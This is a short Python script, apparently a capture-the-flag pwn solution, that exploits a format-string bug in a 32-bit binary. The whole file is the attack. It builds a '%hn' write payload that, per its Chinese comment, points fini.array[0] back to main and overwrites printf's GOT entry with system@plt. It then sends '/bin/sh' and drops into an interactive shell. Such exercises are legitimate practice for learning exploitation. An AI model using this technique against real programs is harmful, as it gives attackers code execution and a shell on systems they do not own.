from parse_args_and_some_func import *

sh = all_parsed_args['io']
# 往fini.array[0]写main@text, printf@got写system@plt
payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn" + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)

sh.recvline()

sh.sendline(payload)

sleep(1)

sh.sendline("/bin/sh")
sh.interactive()
